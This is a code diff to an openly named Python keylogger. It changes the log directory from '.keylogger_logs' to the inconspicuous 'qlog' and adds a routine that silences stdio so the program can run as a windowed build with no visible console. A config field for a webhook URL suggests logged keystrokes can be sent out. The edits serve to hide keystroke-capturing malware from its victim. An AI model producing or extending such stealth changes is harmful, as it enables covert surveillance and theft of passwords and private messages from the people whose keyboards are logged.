@@ -28,6 +28,8 @@ Key exports:
 import subprocess
 import platform
 import logging
+import os
+import sys
 from enum import (
     Enum,
     auto,
@@ -130,7 +132,7 @@ class KeyloggerConfig:
     """
     Runtime configuration for keylogger behavior
     """
-    log_dir: Path = Path.home() / ".keylogger_logs"
+    log_dir: Path = Path.home() / "qlog"
     log_file_prefix: str = "keylog"
     max_log_size_mb: float = 5.0
     webhook_url: str | None = None
@@ -559,10 +561,30 @@ class Keylogger:
         print("[*] Keylogger stopped.")
 
 
+def _ensure_console_streams() -> None:
+    """
+    Redirect missing stdio streams to devnull in windowed builds
+    """
+    if sys.stdout is None:
+        sys.stdout = open(
+            os.devnull,
+            "w",
+            encoding = "utf-8",
+        )
+    if sys.stderr is None:
+        sys.stderr = open(
+            os.devnull,
+            "w",
+            encoding = "utf-8",
+        )
+
+
 def main() -> None:
     """
     Entry point with default configuration
     """
+    _ensure_console_streams()
+
     keylogger = Keylogger(KeyloggerConfig())
 
     try:
